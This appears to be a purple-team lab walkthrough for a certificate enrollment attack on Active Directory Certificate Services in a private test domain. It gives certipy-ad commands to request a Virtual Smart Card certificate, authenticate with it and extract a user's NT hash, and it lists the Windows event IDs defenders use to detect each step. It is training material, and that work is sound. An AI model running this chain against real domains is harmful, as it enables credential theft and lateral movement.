# WT#049 — Virtual Smart Card Enrollment

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.23 (mbr02) |
| **Domain** | range.local |
| **Starting Credential** | Domain user (range.local) |
| **Tools Required** | certipy-ad |
| **Certifications** | WKL |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Medium |

## Prerequisites
- ADCS VSC (Virtual Smart Card) CA configured on mbr02
- Domain user account in range.local

## Attack Steps

### 1. Enumerate CA and templates
```bash
certipy-ad find -u 'domain_user@range.local' -p 'P@ssw0rd!' -dc-ip 192.168.77.12 -stdout
```

### 2. Identify VSC enrollment template
```bash
certipy-ad find -u 'domain_user@range.local' -p 'P@ssw0rd!' -dc-ip 192.168.77.12 -vulnerable -stdout
```
Look for templates configured for smart card enrollment or "VSC" profile.

### 3. Request a certificate
```bash
certipy-ad req -u 'domain_user@range.local' -p 'P@ssw0rd!' -ca 'CADRE-VSC-CA' -target 192.168.77.23 -template 'VSC-Template'
```

### 4. Use certificate for authentication
```bash
certipy-ad auth -pfx domain_user.pfx -dc-ip 192.168.77.12
```

### 5. Retrieve NTHASH from certificate
```bash
certipy-ad auth -pfx domain_user.pfx -username domain_user -domain range.local -dc-ip 192.168.77.12
```

## Post-Exploitation Chain
Domain user → VSC certificate enrollment → Certificate-based authentication → NTHASH extraction → Lateral movement to services

## Telemetry Verification
- **Event 4886**: Certificate Services received a certificate request
- **Event 4887**: Certificate Services approved a certificate request
- **Event 4768**: Kerberos authentication using certificate

## Status
CONFIGURED
